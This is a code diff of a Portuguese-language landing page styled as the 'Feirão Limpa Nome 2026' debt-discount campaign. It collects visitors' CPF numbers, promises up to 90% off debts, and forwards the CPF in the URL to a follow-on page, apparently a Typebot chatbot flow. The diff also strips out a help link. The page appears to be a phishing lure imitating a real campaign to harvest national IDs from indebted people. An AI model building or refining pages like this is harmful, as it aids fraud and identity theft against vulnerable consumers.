@@ -100,9 +100,6 @@
         }
         
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        #template-info { text-align: center; margin-top: 25px; padding-top: 20px; border-top: 1px solid #eee; }
-        .faq-layout { display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; color: var(--color-secondary); font-weight: 700; }
     </style>
 </head>
 
@@ -115,37 +112,23 @@
         <section>
             <h4 class="title">Feirão Limpa Nome</h4>
             <span class="subtitle">2026</span>
-            
-            <p class="description">
-                O Feirão Limpa Nome 2026 começou! Faça login com seu CPF e aproveite até 90% de desconto nas suas dívidas.
-            </p>
+            <p class="description">O Feirão Limpa Nome 2026 começou! Faça login com seu CPF e aproveite até 90% de desconto.</p>
 
             <form id="cpfForm">
                 <div class="float-label-group">
                     <div class="float-label">
-                        <input type="tel" id="cpf" name="cpf" maxlength="14" placeholder="000.000.000-00" required>
+                        <input type="tel" id="cpf" maxlength="14" placeholder="000.000.000-00" required>
                         <label for="cpf"><i class="far fa-id-card"></i> CPF</label>
                     </div>
                 </div>
-
-                <button type="submit" id="verificarBtn" class="button-primary">
-                    <i class="fas fa-search" style="margin-right:8px"></i> Verificar meus descontos
-                </button>
+                <button type="submit" id="verificarBtn" class="button-primary">Verificar meus descontos</button>
             </form>
-            
             <div id="loader" class="loader"></div>
         </section>
-
-        <footer id="template-info">
-            <a href="#" class="faq-layout">
-                <i class="fas fa-question-circle"></i>
-                <span>Preciso de ajuda</span>
-            </a>
-        </footer>
     </div>
 
     <script>
-        // Máscara de CPF nativa (JS Puro)
+        // Máscara visual do CPF
         document.getElementById('cpf').addEventListener('input', function (e) {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 11) v = v.slice(0, 11);
@@ -155,19 +138,21 @@
             e.target.value = v;
         });
 
-        // Redirecionamento direto para a pasta /aproveite/
         document.getElementById('cpfForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const cpfRaw = document.getElementById('cpf').value.replace(/\D/g, '');
+            // LIMPEZA CRÍTICA: Envia apenas os números para evitar erro no Typebot
+            const cpfNumeros = document.getElementById('cpf').value.replace(/\D/g, '');
             
-            if (cpfRaw.length === 11) {
+            if (cpfNumeros.length === 11) {
                 document.getElementById('verificarBtn').disabled = true;
                 document.getElementById('loader').style.display = 'block';
 
-                // Joga o lead para a página seguinte com o CPF na URL
+                // Redireciona enviando o CPF limpo via URL
                 setTimeout(() => {
-                    window.location.href = `./aproveite/index.html?cpf=${cpfRaw}`;
-                }, 600);
+                    window.location.href = `./aproveite/index.html?cpf=${cpfNumeros}`;
+                }, 500);
+            } else {
+                alert("Digite o CPF completo.");
             }
         });
     </script>
